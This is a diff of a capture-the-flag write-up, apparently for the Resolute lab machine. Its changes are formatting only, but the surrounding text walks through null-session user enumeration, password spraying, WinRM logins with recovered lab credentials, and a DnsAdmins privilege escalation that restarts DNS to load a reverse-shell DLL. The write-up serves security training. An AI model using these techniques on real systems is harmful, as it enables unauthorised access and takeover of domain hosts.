@@ -40,7 +40,6 @@ PORT      STATE SERVICE
 
 Using `enum4linux` and null credentials, we can find a list of users and an interesting description:
 
-{% code overflow="wrap" %}
 ```bash
 $ enum4linux -u '' -p '' -a 10.129.85.209 # truncated output 
 index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
@@ -100,7 +99,6 @@ zach
 simon 
 naoki 
 ```
-{% endcode %}
 
 We have a password lf `Welcome123!` and a username list, so password spraying with `crackmapexec` is next.
 
@@ -111,7 +109,7 @@ SMB         10.129.85.209   445    RESOLUTE         [+] megabank.local\melanie:W
 
 We have a user `melanie` who has the weak password. We can login as this user using `evil-winrm`.
 
-<figure><img src="../../../.gitbook/assets/image (2637).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2637).png>)
 
 Grab the user flag.
 
@@ -158,7 +156,6 @@ d--h--        12/3/2019   6:45 AM                20191203
 
 Within this file, there is a PowerShell transcript, which contains credentials.
 
-{% code overflow="wrap" %}
 ```
 *Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 
@@ -169,11 +166,10 @@ cmd : The syntax of this command is:
 At line:1 char:1
 + cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 ```
-{% endcode %}
 
 With these credentials, we can login as `ryan`.
 
-<figure><img src="../../../.gitbook/assets/image (3321).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3321).png>)
 
 ### DNS Admin
 
@@ -210,14 +206,12 @@ Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
 Also, there's a note within the desktop:
 
-{% code overflow="wrap" %}
 ```
 *Evil-WinRM* PS C:\Users\ryan\desktop> cat note.txt
 Email to team:
 
 - due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
 ```
-{% endcode %}
 
 This means that we have control over DNS and can change the DLL file with a reverse shell. We should also be able to start and stop the service.
 
@@ -240,4 +234,4 @@ sc.exe stop dns
 sc.exe start dns
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2608).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2608).png>)
